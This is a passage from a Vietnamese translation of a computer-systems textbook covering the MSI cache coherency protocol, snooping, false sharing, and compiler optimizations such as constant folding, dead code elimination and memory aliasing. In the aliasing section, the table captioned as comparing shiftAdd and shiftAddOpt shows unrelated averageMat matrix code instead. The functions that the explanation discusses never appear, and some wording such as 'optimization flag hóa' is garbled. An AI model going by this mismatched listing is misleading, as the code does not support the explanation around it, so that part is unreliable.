<li>Nếu block đang ở trạng thái <strong>M</strong>, ghi trực tiếp vào bản sao trong cache. Không cần thay đổi flag (block vẫn ở trạng thái M).</li>
<li>Nếu block đang ở trạng thái <strong>I</strong> hoặc <strong>S</strong>, thông báo cho các core khác rằng block đang bị ghi (modified). Các <strong>L1 cache</strong> khác đang lưu block ở trạng thái <strong>S</strong> phải <strong>clear</strong> S bit và <strong>set</strong> I bit (bản sao của chúng giờ đã lỗi thời so với bản sao đang được ghi). Nếu một <strong>L1 cache</strong> khác có block ở trạng thái <strong>M</strong>, nó sẽ ghi ngược block xuống cấp thấp hơn và đặt bản sao của mình về trạng thái <strong>I</strong>. Core thực hiện ghi sau đó sẽ nạp giá trị mới của block vào <strong>L1 cache</strong> của mình, <strong>set</strong> M flag (bản sao sẽ bị sửa đổi bởi thao tác ghi), <strong>clear</strong> I flag (bản sao giờ hợp lệ), và ghi vào block trong cache.</li>
</ul>
<p>Từ <strong>Hình 2</strong> đến <strong>Hình 4</strong> minh họa từng bước của <strong>MSI protocol</strong> khi đảm bảo tính nhất quán cho các truy cập đọc và ghi vào một khối dữ liệu được cache trong <strong>L1 cache</strong> riêng của hai core. Trong <strong>Hình 2</strong>, ví dụ bắt đầu với khối dữ liệu dùng chung được sao chép vào <strong>L1 cache</strong> của cả hai core với <strong>S flag</strong> được set, nghĩa là các bản sao trong L1 cache giống với giá trị của block trong <strong>L2 cache</strong> (tất cả bản sao lưu giá trị hiện tại của block là 6). Lúc này, cả core 0 và core 1 đều có thể đọc an toàn từ bản sao trong L1 cache của mình mà không kích hoạt hành động duy trì tính nhất quán (S flag cho biết bản sao chia sẻ là mới nhất).</p>
<p><img src="C11-MemHierarchy/_images/MSIstart.png" alt="An example illustrating a block of memory copied into two core's L1 caches, both in the S state." /></p>
<p><strong>Hình 2.</strong> Ban đầu, cả hai core đều có bản sao của block trong L1 cache riêng với <strong>S flag</strong> được set (trạng thái Shared)</p>
<p>Nếu core 0 ghi vào bản sao của block trong L1 cache của mình, <strong>L1 cache controller</strong> của nó sẽ thông báo cho các L1 cache khác <strong>invalidate</strong> (vô hiệu hóa) bản sao của block. <strong>L1 cache controller</strong> của core 1 sẽ <strong>clear</strong> S flag và <strong>set</strong> I flag trên bản sao của mình, cho biết bản sao đã lỗi thời. Core 0 ghi vào bản sao trong L1 cache (thay đổi giá trị thành 7 trong ví dụ), <strong>set</strong> M flag và <strong>clear</strong> S flag trên cache line để cho biết bản sao đã bị sửa đổi và lưu giá trị hiện tại của block. Lúc này, bản sao trong <strong>L2 cache</strong> và trong <strong>L1 cache</strong> của core 1 đều đã lỗi thời. Trạng thái cache sau đó được thể hiện trong <strong>Hình 3</strong>.</p>
<p><img src="C11-MemHierarchy/_images/MSIwrite.png" alt="An example illustrating the steps taken by the MSI protocol on a write to a block of memory that is shared by more than one L1 cache." /></p>
<p><strong>Hình 3.</strong> Trạng thái cache sau khi core 0 ghi vào bản sao của block</p>
<p>Lúc này, core 0 có thể đọc an toàn từ bản sao trong cache vì nó đang ở trạng thái <strong>M</strong>, nghĩa là lưu giá trị mới nhất của block.</p>
<p>Nếu core 1 tiếp theo đọc từ block, <strong>I flag</strong> trên bản sao trong L1 cache của nó cho biết bản sao đã lỗi thời và không thể dùng để đáp ứng yêu cầu đọc. <strong>L1 cache controller</strong> của core 1 phải nạp giá trị mới của block vào L1 cache trước khi đọc. Để làm điều này, <strong>L1 cache controller</strong> của core 0 phải ghi ngược giá trị đã sửa đổi của block xuống <strong>L2 cache</strong>, để <strong>L1 cache</strong> của core 1 có thể đọc giá trị mới vào. Kết quả của các hành động này (thể hiện trong <strong>Hình 4</strong>) là bản sao trong <strong>L1 cache</strong> của cả core 0 và core 1 đều ở trạng thái <strong>S</strong>, cho biết mỗi bản sao đều mới nhất và có thể dùng an toàn cho các lần đọc tiếp theo.</p>
<p><img src="C11-MemHierarchy/_images/MSIread.png" alt="An example illustrating the steps taken by the MSI protocol on a read to a block of memory that is cached in the I state." /></p>
<p><strong>Hình 4.</strong> Trạng thái cache sau khi Core 1 thực hiện đọc block</p>
<h3 id="1163-triển-khai-các-cache-coherency-protocol-giao-thức-duy-trì-tính-nhất-quán-cache"><a class="header" href="#1163-triển-khai-các-cache-coherency-protocol-giao-thức-duy-trì-tính-nhất-quán-cache">11.6.3. Triển khai các Cache Coherency Protocol (Giao thức duy trì tính nhất quán cache)</a></h3>
<p>Để triển khai một <strong>cache coherency protocol</strong>, bộ xử lý cần một cơ chế để xác định khi nào việc truy cập vào nội dung <strong>L1 cache</strong> của một core đòi hỏi thay đổi trạng thái nhất quán liên quan đến nội dung <strong>L1 cache</strong> của các core khác.<br />
Một cách để thực hiện cơ chế này là thông qua <strong>snooping</strong> (theo dõi) trên một <strong>bus</strong> được chia sẻ bởi tất cả các L1 cache. Một <strong>snooping cache controller</strong> sẽ lắng nghe (hoặc snoop) trên bus để phát hiện các thao tác đọc hoặc ghi vào những block mà nó đang cache.<br />
Vì mọi yêu cầu đọc và ghi đều được xác định theo địa chỉ bộ nhớ, một <strong>snooping L1 cache controller</strong> có thể nhận biết bất kỳ thao tác đọc hoặc ghi nào từ một L1 cache khác đối với block mà nó lưu trữ, và sau đó phản hồi phù hợp dựa trên <strong>coherency protocol</strong>.<br />
Ví dụ, nó có thể <strong>set</strong> I flag trên một cache line khi snoop thấy một thao tác ghi vào cùng địa chỉ đó bởi một L1 cache khác. Đây là cách một <strong>write-invalidate protocol</strong> (giao thức ghi-vô hiệu hóa) được triển khai với snooping.</p>
<p><strong>MSI</strong> và các giao thức tương tự như <strong>MESI</strong> và <strong>MOESI</strong> đều là <strong>write-invalidate protocol</strong> — tức là các giao thức sẽ vô hiệu hóa các bản sao cache khi có thao tác ghi.<br />
Snooping cũng có thể được sử dụng trong các <strong>write-update cache coherency protocol</strong> (giao thức duy trì tính nhất quán cache kiểu ghi-cập nhật), trong đó giá trị mới của dữ liệu được snoop từ bus và áp dụng để cập nhật tất cả các bản sao được lưu trong các L1 cache khác.</p>
<p>Thay vì snooping, có thể sử dụng <strong>directory-based cache coherence mechanism</strong> (cơ chế duy trì tính nhất quán cache dựa trên bảng chỉ mục) để kích hoạt các <strong>cache coherency protocol</strong>.<br />
Phương pháp này mở rộng tốt hơn snooping do hạn chế về hiệu năng khi nhiều core chia sẻ một bus duy nhất. Tuy nhiên, cơ chế dựa trên bảng chỉ mục yêu cầu lưu trữ nhiều trạng thái hơn để phát hiện khi nào các block bộ nhớ được chia sẻ, và thường chậm hơn snooping.</p>
<h3 id="1164-thêm-về-multicore-caching"><a class="header" href="#1164-thêm-về-multicore-caching">11.6.4. Thêm về Multicore Caching</a></h3>
<p>Lợi ích về hiệu năng khi mỗi core của một <strong>multicore processor</strong> có cache riêng ở cấp cao nhất của <strong>memory hierarchy</strong> — dùng để lưu trữ bản sao dữ liệu và lệnh chương trình mà core đó thực thi — là xứng đáng với sự phức tạp bổ sung do bộ xử lý phải triển khai <strong>cache coherency protocol</strong>.</p>
<p>Mặc dù <strong>cache coherency</strong> giải quyết vấn đề nhất quán bộ nhớ trên các bộ xử lý đa nhân với <strong>L1 cache</strong> riêng, vẫn tồn tại một vấn đề khác có thể phát sinh do các <strong>cache coherency protocol</strong> trên bộ xử lý đa nhân.<br />
Vấn đề này gọi là <strong>false sharing</strong> (chia sẻ giả), có thể xảy ra khi nhiều <strong>thread</strong> của một chương trình song song đa luồng chạy đồng thời trên nhiều core và truy cập các vị trí bộ nhớ gần với các vị trí được truy cập bởi các thread khác.<br />
Trong <a href="C11-MemHierarchy/../C14-SharedMemory/cache_coherence.html#_cache_coherence_and_false_sharing">Chương 14.5</a>, chúng ta sẽ thảo luận về vấn đề <strong>false sharing</strong> và một số giải pháp.</p>
<p>Để biết thêm thông tin chi tiết về <strong>hardware caching</strong> trên <strong>multicore processor</strong>, bao gồm các giao thức khác nhau và cách chúng được triển khai, hãy tham khảo một giáo trình <strong>computer architecture</strong> (kiến trúc máy tính)^1^.</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="117-tóm-tắt-summary"><a class="header" href="#117-tóm-tắt-summary">11.7. Tóm tắt (Summary)</a></h2>
<p>Chương này đã khám phá các đặc điểm của thiết bị lưu trữ máy tính và sự đánh đổi giữa các yếu tố quan trọng như <strong>access latency</strong> (độ trễ truy cập), <strong>storage capacity</strong> (dung lượng lưu trữ), <strong>transfer latency</strong> (độ trễ truyền dữ liệu), và chi phí.<br />
Do các thiết bị có nhiều sự đánh đổi về thiết kế và hiệu năng, chúng tự nhiên hình thành một <strong>memory hierarchy</strong> (hệ phân cấp bộ nhớ), được sắp xếp theo dung lượng và thời gian truy cập.<br />
Ở đỉnh của hệ phân cấp, các thiết bị lưu trữ chính như <strong>CPU cache</strong> và <strong>main memory</strong> cung cấp dữ liệu nhanh chóng trực tiếp cho CPU, nhưng dung lượng hạn chế.<br />
Ở các cấp thấp hơn, các thiết bị lưu trữ phụ như <strong>solid-state drive (SSD)</strong> và <strong>hard disk</strong> cung cấp dung lượng lưu trữ lớn với mật độ cao, nhưng hiệu năng thấp hơn.</p>
<p>Vì các hệ thống hiện đại cần cả dung lượng lớn và hiệu năng tốt, các nhà thiết kế hệ thống xây dựng máy tính với nhiều dạng lưu trữ khác nhau.<br />
Điều quan trọng là hệ thống phải quản lý thiết bị lưu trữ nào sẽ chứa từng phần dữ liệu cụ thể.<br />
Hệ thống sẽ cố gắng lưu dữ liệu đang được sử dụng tích cực trong các thiết bị lưu trữ nhanh hơn, và chuyển dữ liệu ít được sử dụng sang các thiết bị lưu trữ chậm hơn.</p>
<p>Để xác định dữ liệu nào đang được sử dụng, hệ thống dựa vào các mẫu truy cập dữ liệu của chương trình, được gọi là <strong>locality</strong>.<br />
Chương trình thể hiện hai dạng locality quan trọng:</p>
<ul>
<li><strong>Temporal Locality</strong>: Chương trình có xu hướng truy cập cùng một dữ liệu nhiều lần theo thời gian.</li>
<li><strong>Spatial Locality</strong>: Chương trình có xu hướng truy cập dữ liệu nằm gần dữ liệu đã được truy cập trước đó.</li>
</ul>
<p><strong>Locality</strong> là cơ sở cho <strong>CPU cache</strong>, nơi lưu trữ một phần nhỏ của <strong>main memory</strong> trong bộ nhớ nhanh nằm trực tiếp trên chip CPU.<br />
Khi chương trình cố gắng truy cập <strong>main memory</strong>, CPU sẽ kiểm tra dữ liệu trong cache trước; nếu tìm thấy, nó sẽ tránh được việc truy cập tốn kém hơn xuống bộ nhớ chính.</p>
<p>Khi chương trình gửi yêu cầu đọc hoặc ghi bộ nhớ, nó cung cấp <strong>address</strong> (địa chỉ) của vị trí bộ nhớ cần truy cập. <strong>CPU cache</strong> sử dụng ba phần của các bit trong địa chỉ bộ nhớ để xác định cache line lưu trữ phần nào của <strong>main memory</strong>:</p>
<ol>
<li>Các bit <em>index</em> ở giữa ánh xạ địa chỉ tới một vị trí lưu trữ trong cache.</li>
<li>Các bit <em>tag</em> ở phần cao của địa chỉ xác định duy nhất phần bộ nhớ mà vị trí cache đó lưu trữ.</li>
<li>Các bit <em>offset</em> ở phần thấp của địa chỉ xác định byte cụ thể trong dữ liệu được lưu mà chương trình muốn truy cập.</li>
</ol>
<p>Cuối cùng, chương này kết thúc bằng việc minh họa cách công cụ <strong>Cachegrind</strong> có thể hỗ trợ phân tích hiệu năng cache cho một chương trình đang chạy.<br />
<strong>Cachegrind</strong> mô phỏng sự tương tác của chương trình với hệ thống cache và thu thập thống kê về việc sử dụng cache của chương trình (ví dụ: tỷ lệ <strong>hit</strong> và <strong>miss</strong>).</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="12-tối-ưu-hóa-code-code-optimization"><a class="header" href="#12-tối-ưu-hóa-code-code-optimization">12. Tối ưu hóa code (Code Optimization)</a></h2>
<p><strong>Code optimization</strong> (tối ưu hóa code) là quá trình cải thiện một chương trình bằng cách giảm kích thước code, độ phức tạp, mức sử dụng bộ nhớ hoặc thời gian chạy (hoặc kết hợp các yếu tố này) mà không thay đổi chức năng vốn có của chương trình.<br />
Nhiều hệ thống biên dịch bao gồm một <strong>code optimizer</strong> (bộ tối ưu code) như một bước trung gian. Cụ thể, một <strong>optimizing compiler</strong> (trình biên dịch tối ưu) sẽ áp dụng các phép biến đổi cải thiện code như một phần của quá trình biên dịch. Hầu như tất cả các trình biên dịch hiện đại (bao gồm GCC) đều là optimizing compiler.<br />
Trình biên dịch C của GCC triển khai nhiều <strong>optimization flag</strong> (optimization flag hóa) cho phép lập trình viên truy cập trực tiếp một tập con các tối ưu hóa đã được triển khai. Các optimization flag hóa này giúp tối ưu code nhưng phải đánh đổi với thời gian biên dịch và khả năng gỡ lỗi.<br />
Để đơn giản, GCC gói một tập con các optimization flag hóa này thành các <strong>optimization level</strong> (mức tối ưu hóa) khác nhau mà lập trình viên có thể gọi trực tiếp. Ví dụ, lệnh sau biên dịch một chương trình mẫu với mức tối ưu hóa cấp 1:</p>
<pre><code class="language-bash">$ gcc -O1 -o program program.c
</code></pre>
<p>Mức tối ưu hóa 1 (<code>-O1</code> hoặc <code>-O</code>) trong GCC thực hiện các tối ưu hóa cơ bản để giảm kích thước code và thời gian thực thi, đồng thời cố gắng giữ thời gian biên dịch ở mức tối thiểu.<br />
Mức tối ưu hóa 2 (<code>-O2</code>) bao gồm hầu hết các tối ưu hóa đã được GCC triển khai mà không liên quan đến sự đánh đổi giữa dung lượng và hiệu năng.<br />
Cuối cùng, mức tối ưu hóa 3 (<code>-O3</code>) thực hiện thêm các tối ưu hóa bổ sung (chẳng hạn như <strong>function inlining</strong> — nội tuyến hàm, sẽ được thảo luận sau trong chương này) và có thể khiến chương trình mất nhiều thời gian biên dịch hơn đáng kể.<br />
<a href="https://gcc.gnu.org/onlinedocs/gcc/Optimize-Options.html">Tài liệu GCC</a> mô tả chi tiết các optimization flag hóa đã được triển khai.</p>
<p>Việc thảo luận chi tiết về optimizing compiler và cách xây dựng, vận hành của chúng nằm ngoài phạm vi của cuốn sách này; chúng tôi khuyến khích bạn đọc quan tâm tìm hiểu cuốn sách kinh điển <em>Compilers: Principles, Techniques, and Tools</em> của Aho, Sethi và Ullman.<br />
Mục đích của chương này là làm nổi bật một số điều mà hầu hết các trình biên dịch có thể (và không thể) làm, cũng như cách lập trình viên có thể phối hợp với trình biên dịch và các công cụ profiling để giúp cải thiện code của mình.</p>
<h3 id="những-gì-trình-biên-dịch-đã-làm-sẵn"><a class="header" href="#những-gì-trình-biên-dịch-đã-làm-sẵn">Những gì trình biên dịch đã làm sẵn</a></h3>
<p>Một số tối ưu hóa phổ biến được hầu hết mọi trình biên dịch thực hiện sẽ được mô tả ngắn gọn trong các phần tiếp theo.<br />
Sinh viên <em>không bao giờ</em> nên tự tay triển khai các tối ưu hóa này, vì chúng đã được trình biên dịch thực hiện sẵn.</p>
<p><strong>Constant Folding</strong> (gộp hằng)</p>
<p>:   Các hằng số trong code được tính toán ngay tại thời điểm biên dịch để giảm số lượng lệnh sinh ra.<br />
Ví dụ, trong đoạn code dưới đây, <strong>macro expansion</strong> (mở rộng macro) thay câu lệnh <code>int debug = N-5</code> bằng <code>int debug = 5-5</code>. Sau đó, <strong>constant folding</strong> cập nhật câu lệnh này thành <code>int debug = 0</code>.</p>
<pre><code class="language-c">#define N 5
int debug = N - 5; // constant folding thay đổi câu lệnh này thành debug = 0;
</code></pre>
<p><strong>Constant Propagation</strong> (truyền hằng)</p>
<p>:   <strong>Constant propagation</strong> thay thế biến bằng một giá trị hằng nếu giá trị đó được biết tại thời điểm biên dịch.<br />
Xem đoạn code sau:</p>
<pre><code class="language-c">int debug = 0;

// sums up all the elements in an array
int doubleSum(int *array, int length){
    int i, total = 0;
    for (i = 0; i &lt; length; i++){
        total += array[i];
        if (debug) {
            printf(&quot;array[%d] is: %d\n&quot;, i, array[i]);
        }
    }
    return 2 * total;
}
</code></pre>
<p>Một trình biên dịch áp dụng constant propagation sẽ thay <code>if (debug)</code> thành <code>if (0)</code>.</p>
<p><strong>Dead Code Elimination</strong> (loại bỏ code chết)</p>
<p>:   Không hiếm khi một chương trình chứa các biến, phép gán hoặc câu lệnh không được sử dụng.<br />
Mặc dù các câu lệnh không cần thiết này hiếm khi được đưa vào một cách cố ý, nhưng chúng thường là sản phẩm phụ tự nhiên của quá trình phát triển và tinh chỉnh phần mềm liên tục.<br />
Nếu không được phát hiện, các đoạn code gọi là <strong>dead code</strong> này có thể khiến trình biên dịch sinh ra các lệnh assembly không cần thiết, từ đó lãng phí thời gian xử lý.<br />
Hầu hết các trình biên dịch sử dụng các kỹ thuật như <strong>dataflow analysis</strong> (phân tích luồng dữ liệu) để xác định các đoạn code không thể truy cập và loại bỏ chúng.<br />
<strong>Dead code elimination</strong> thường giúp chương trình chạy nhanh hơn bằng cách thu nhỏ kích thước code và tập lệnh liên quan.<br />
Ví dụ, hãy xem lại hàm <code>doubleSum</code> trong đó trình biên dịch đã áp dụng constant propagation để thay <code>debug</code> bằng <code>0</code> trong câu lệnh <code>if</code>:</p>
<pre><code class="language-c">int debug = 0;

// sums up all the elements in an array
int doubleSum(int *array, int length){
    int i, total = 0;
    for (i = 0; i &lt; length; i++){
        total += array[i];
        if (0) { // debug đã được thay bằng hằng số 0 bởi trình biên dịch
            printf(&quot;array[%d] is: %d\n&quot;, i, array[i]);
        }
    }
    return 2 * total;
}
</code></pre>
<p>Một trình biên dịch sử dụng dataflow analysis sẽ nhận ra rằng câu lệnh <code>if</code> này luôn sai và câu lệnh <code>printf</code> sẽ không bao giờ được thực thi.<br />
Do đó, trình biên dịch sẽ loại bỏ câu lệnh <code>if</code> và lời gọi <code>printf</code> trong file thực thi đã biên dịch.<br />
Một lượt tối ưu khác cũng sẽ loại bỏ câu lệnh <code>debug = 0</code>.</p>
<p><strong>Simplifying expressions</strong> (đơn giản hóa biểu thức)</p>
<p>:   Một số lệnh tốn nhiều chi phí hơn các lệnh khác.<br />
Ví dụ, các lệnh số học <code>imul</code> và <code>idiv</code> trong assembly mất nhiều thời gian để thực thi.<br />
Trình biên dịch thường cố gắng giảm số lượng các lệnh tốn kém này bằng cách đơn giản hóa các phép toán bất cứ khi nào có thể.<br />
Ví dụ, trong hàm <code>doubleSum</code>, trình biên dịch có thể thay biểu thức <code>2 * total</code> bằng <code>total + total</code> vì lệnh cộng ít tốn chi phí hơn phép nhân:</p>
<pre><code>//declaration of debug removed through dead-code elimination

//sums up all the elements in an array
int doubleSum(int *array, int length){
    int i, total = 0;
    for (i = 0; i &lt; length; i++){
        total += array[i];
        //if statement removed through data-flow analysis
    }
    return total + total; //simplifying expression
}
</code></pre>
<p>Tương tự, trình biên dịch cũng sẽ biến đổi các đoạn code sử dụng <strong>bit-shifting</strong> (dịch bit) và các toán tử bitwise khác để đơn giản hóa biểu thức.<br />
Ví dụ, trình biên dịch có thể thay biểu thức <code>total * 8</code> bằng <code>total &lt;&lt; 3</code>, hoặc thay biểu thức <code>total % 8</code> bằng <code>total &amp; 7</code>, vì các phép toán bitwise được thực hiện chỉ với một lệnh nhanh duy nhất.</p>
<h3 id="những-gì-trình-biên-dịch-không-phải-lúc-nào-cũng-làm-được-lợi-ích-của-việc-học-tối-ưu-hóa-code"><a class="header" href="#những-gì-trình-biên-dịch-không-phải-lúc-nào-cũng-làm-được-lợi-ích-của-việc-học-tối-ưu-hóa-code">Những gì trình biên dịch không phải lúc nào cũng làm được: Lợi ích của việc học tối ưu hóa code</a></h3>
<p>Với những lợi ích mà <strong>optimizing compiler</strong> (trình biên dịch tối ưu) mang lại, có thể sẽ không rõ ràng ngay lập tức tại sao việc học tối ưu hóa code lại hữu ích.<br />
Bạn có thể dễ dàng nghĩ về trình biên dịch như một “hộp đen” thông minh kỳ diệu. Nhưng cuối cùng, trình biên dịch cũng chỉ là một phần mềm thực hiện một loạt các phép biến đổi code nhằm tăng tốc độ chạy.<br />
Trình biên dịch cũng bị giới hạn trong các loại tối ưu hóa mà nó có thể thực hiện.</p>
<p><strong>Algorithmic Strength Reduction Is Impossible</strong> (Không thể giảm độ phức tạp thuật toán một cách tự động)</p>
<p>:   Nguyên nhân hàng đầu dẫn đến hiệu năng kém là do lựa chọn sai <strong>data structure</strong> (cấu trúc dữ liệu) và <strong>algorithm</strong> (thuật toán).<br />
Trình biên dịch không thể “phép màu” sửa chữa những quyết định sai này.<br />
Ví dụ, một trình biên dịch sẽ không bao giờ tối ưu một chương trình đang cài đặt <strong>bubble sort</strong> thành một chương trình dùng <strong>quick sort</strong>.<br />
Mặc dù độ tinh vi của trình biên dịch và các tối ưu hóa của nó ngày càng được cải thiện, nhưng <em>chất lượng</em> tối ưu hóa của từng trình biên dịch cụ thể vẫn khác nhau giữa các nền tảng.<br />
Do đó, trách nhiệm thuộc về lập trình viên trong việc đảm bảo code của mình sử dụng các thuật toán và cấu trúc dữ liệu tốt nhất.</p>
<p><strong>Compiler Optimization Flags Are Not Guaranteed to Make Code &quot;Optimal&quot; (or Consistent)</strong><br />
(Các optimization flag hóa của trình biên dịch không đảm bảo code sẽ “tối ưu” hoặc nhất quán)</p>
<p>:   Việc tăng mức tối ưu hóa của trình biên dịch (ví dụ: từ <code>-O2</code> lên <code>-O3</code>) không phải lúc nào cũng làm giảm thời gian chạy của chương trình.<br />
Đôi khi, lập trình viên có thể phát hiện rằng việc nâng optimization flag từ <code>-O2</code> lên <code>-O3</code> lại <em>làm chậm</em> chương trình, hoặc không mang lại cải thiện hiệu năng nào.<br />
Trong một số trường hợp khác, lập trình viên có thể thấy rằng chương trình biên dịch <strong>không</strong> dùng optimization flag thì chạy bình thường, nhưng khi biên dịch với <code>-O2</code> hoặc <code>-O3</code> lại gây ra <strong>segmentation fault</strong> hoặc lỗi khác.<br />
Những lỗi lập trình kiểu này đặc biệt khó gỡ, vì cờ debug (<code>-g</code>) của GCC không tương thích với các optimization flag (<code>-O</code>), do các phép biến đổi mà trình biên dịch thực hiện ở các mức <code>-O</code> gây cản trở khả năng phân tích code của <strong>debugger</strong>.<br />
Cờ <code>-g</code> lại là yêu cầu bắt buộc của nhiều công cụ profiling phổ biến như GDB và Valgrind.</p>
<p>Một nguyên nhân lớn gây ra hành vi không nhất quán là do tiêu chuẩn C/C++ không đưa ra hướng dẫn rõ ràng về cách xử lý <strong>undefined behavior</strong> (hành vi không xác định).<br />
Kết quả là, thường thì trình biên dịch sẽ tự quyết định cách xử lý sự mơ hồ này.<br />
Sự khác biệt trong cách các mức tối ưu hóa xử lý undefined behavior có thể khiến kết quả <em>thay đổi</em>.<br />
Xem ví dụ sau từ John Regehr¹:</p>
<pre><code class="language-c">int silly(int a) {
  return (a + 1) &gt; a;
}
</code></pre>
<p>Giả sử <code>silly</code> được chạy với <code>a = INT_MAX</code>. Trong trường hợp này, phép tính <code>a + 1</code> gây <strong>integer overflow</strong> (tràn số nguyên).<br />
Tuy nhiên, tiêu chuẩn C/C++ không định nghĩa <em>cách</em> trình biên dịch phải xử lý tràn số nguyên.<br />
Thực tế, biên dịch chương trình <strong>không</strong> dùng tối ưu hóa khiến hàm trả về 0, trong khi biên dịch với tối ưu hóa <code>-O3</code> lại khiến hàm trả về 1.</p>
<p>Tóm lại, các optimization flag hóa nên được sử dụng một cách thận trọng, có cân nhắc và khi thật sự cần thiết.<br />
Việc hiểu rõ optimization flag nào nên dùng cũng giúp lập trình viên <strong>hợp tác</strong> với trình biên dịch thay vì “đối đầu” với nó.</p>
<blockquote>
<p><strong>The compiler is not required to handle undefined behavior</strong><br />
Hàm <code>silly</code> khi chạy với <code>a = INT_MAX</code> là một ví dụ về undefined behavior.<br />
Lưu ý rằng kết quả không nhất quán do trình biên dịch tạo ra <strong>không</strong> phải là lỗi thiết kế của trình biên dịch hay là hậu quả của việc dùng optimization flag hóa.<br />
Trình biên dịch được thiết kế để tuân theo <strong>specification</strong> (đặc tả) của ngôn ngữ.<br />
Tiêu chuẩn ngôn ngữ C không quy định trình biên dịch phải làm gì khi gặp undefined behavior; chương trình có thể bị crash, không biên dịch được, hoặc tạo ra kết quả không nhất quán hoặc sai.<br />
Cuối cùng, lập trình viên phải chịu trách nhiệm phát hiện và loại bỏ undefined behavior trong code.<br />
Việc <code>silly</code> nên trả về 0, 1 hay giá trị khác là quyết định mà lập trình viên phải đưa ra.<br />
Để tìm hiểu thêm về undefined behavior và các vấn đề liên quan trong C, hãy xem <strong>C FAQ²</strong> hoặc blog của John Regehr¹.</p>
</blockquote>
<p><strong>Pointers Can Prove Problematic</strong> (Con trỏ có thể gây rắc rối)</p>
<p>:   Hãy nhớ rằng trình biên dịch chỉ thực hiện các phép biến đổi mà không làm thay đổi hành vi cơ bản của chương trình nguồn.<br />
Nếu một phép biến đổi có nguy cơ thay đổi hành vi của chương trình, trình biên dịch sẽ không thực hiện nó.<br />
Điều này đặc biệt đúng trong trường hợp <strong>memory aliasing</strong> (trùng địa chỉ bộ nhớ), khi hai con trỏ khác nhau trỏ đến cùng một địa chỉ trong bộ nhớ.<br />
Ví dụ, hãy xem hàm <code>shiftAdd</code> dưới đây, nhận hai con trỏ số nguyên làm tham số. Hàm này nhân số thứ nhất với 10 và cộng số thứ hai vào.<br />
Vì vậy, nếu <code>shiftAdd</code> được truyền vào hai số nguyên 5 và 6, kết quả sẽ là 56.</p>
<h4 id="averagemat_v1-2"><a class="header" href="#averagemat_v1-2">averageMat_v1</a></h4>
<pre><code class="language-c">float averageMat_v1(int **mat, int n) {
    int i, j, total = 0;
    for (i = 0; i &lt; n; i++) {
        for (j = 0; j &lt; n; j++) {
            // Note indexing: [i][j]
            total += mat[i][j];
        }
    }
    return (float) total / (n * n);
}
</code></pre>
<h4 id="averagemat_v2-2"><a class="header" href="#averagemat_v2-2">averageMat_v2</a></h4>
<pre><code class="language-c">float averageMat_v2(int **mat, int n) {
    int i, j, total = 0;
    for (i = 0; i &lt; n; i++) {
        for (j = 0; j &lt; n; j++) {
            // Note indexing: [j][i]
            total += mat[j][i];
        }
    }
    return (float) total / (n * n);
}
</code></pre>
<p><strong>Bảng 1.</strong> So sánh hai hàm nhân số thứ nhất với 10 và cộng số thứ hai vào. Có tại <a href="C12-CodeOpt/_attachments/shiftadd.c">liên kết này</a>.</p>
<p>Hàm <code>shiftAddOpt</code> tối ưu hàm <code>shiftAdd</code> bằng cách loại bỏ một lần truy cập bộ nhớ bổ sung tới <code>a</code>, dẫn đến tập lệnh nhỏ hơn trong code assembly đã biên dịch.<br />
Tuy nhiên, trình biên dịch sẽ <strong>không bao giờ</strong> tự thực hiện tối ưu hóa này do rủi ro <strong>memory aliasing</strong> (trùng địa chỉ bộ nhớ).<br />
Để hiểu lý do, hãy xem xét hàm <code>main</code> sau:</p>
<pre><code class="language-c">int main(void){
    int x = 5;
    int y = 6;
    shiftAdd(&amp;x, &amp;y); // should produce 56
    printf(&quot;shiftAdd produces: %d\n&quot;, x);

    x = 5; // reset x
    shiftAddOpt(&amp;x, &amp;y); // should produce 56
    printf(&quot;shiftAddOpt produces: %d\n&quot;, x);

    return 0;
}
</code></pre>
<p>Biên dịch và chạy chương trình này cho kết quả như mong đợi:</p>
<pre><code class="language-bash">$ gcc -o shiftadd shiftadd.c
$ ./shiftadd
shiftAdd produces: 56
shiftAddOpt produces: 56
</code></pre>
<p>Giả sử, thay vào đó, chương trình được sửa đổi để <code>shiftAdd</code> nhận <strong>cùng một con trỏ tới <code>x</code></strong> cho cả hai tham số:</p>
<pre><code class="language-c">int main(void){
    int x = 5;
    shiftAdd(&amp;x, &amp;x); // should produce 55
    printf(&quot;shiftAdd produces: %d\n&quot;, x);

    x = 5; // reset x
    shiftAddOpt(&amp;x, &amp;x); // should produce 55
    printf(&quot;shiftAddOpt produces: %d\n&quot;, x);

    return 0;
}
</code></pre>
<p>Kết quả mong đợi là <strong>55</strong>.<br />
Tuy nhiên, khi biên dịch và chạy lại code đã cập nhật, ta nhận được <strong>hai kết quả khác nhau</strong>:</p>
<pre><code class="language-bash">$ gcc -o shiftadd shiftadd.c
$ ./shiftadd
shiftAdd produces: 100
shiftAddOpt produces: 55
</code></pre>
<p>Lần theo quá trình thực thi của các hàm <code>shiftAdd</code> với giả định rằng <code>a</code> và <code>b</code> cùng trỏ tới <strong>cùng một vị trí bộ nhớ</strong> sẽ thấy vấn đề:<br />
Phép nhân <code>a</code> với 10 trong <code>shiftAdd</code> cập nhật <code>x</code> thành 50.<br />
Tiếp theo, phép cộng <code>a</code> với <code>b</code> trong <code>shiftAdd</code> khiến <code>x</code> tăng gấp đôi thành 100.</p>
<p>Rủi ro <strong>memory aliasing</strong> cho thấy <code>shiftAdd</code> và <code>shiftAddOpt</code> <strong>thực tế không tương đương</strong>, mặc dù lập trình viên có thể đã dự định như vậy.</p>
<p>Để khắc phục, cần nhận ra rằng tham số thứ hai của <code>shiftAdd</code> <strong>không cần</strong> truyền vào dưới dạng con trỏ.<br />
Thay thế tham số thứ hai bằng một số nguyên sẽ loại bỏ rủi ro aliasing và cho phép trình biên dịch tối ưu một hàm thành hàm còn lại:</p>
<h4 id="shiftadd-phiên-bản-chưa-tối-ưu---đã-sửa"><a class="header" href="#shiftadd-phiên-bản-chưa-tối-ưu---đã-sửa">shiftAdd (phiên bản chưa tối ưu - đã sửa)</a></h4>
<pre><code class="language-c">void shiftAdd(int *a, int b){
    *a = *a * 10; // multiply by 10
    *a += b;      // add b
}
</code></pre>
<h4 id="shiftaddopt-phiên-bản-tối-ưu---đã-sửa"><a class="header" href="#shiftaddopt-phiên-bản-tối-ưu---đã-sửa">shiftAddOpt (phiên bản tối ưu - đã sửa)</a></h4>
<pre><code class="language-c">void shiftAddOpt(int *a, int b){
    *a = (*a * 10) + b;
}
</code></pre>
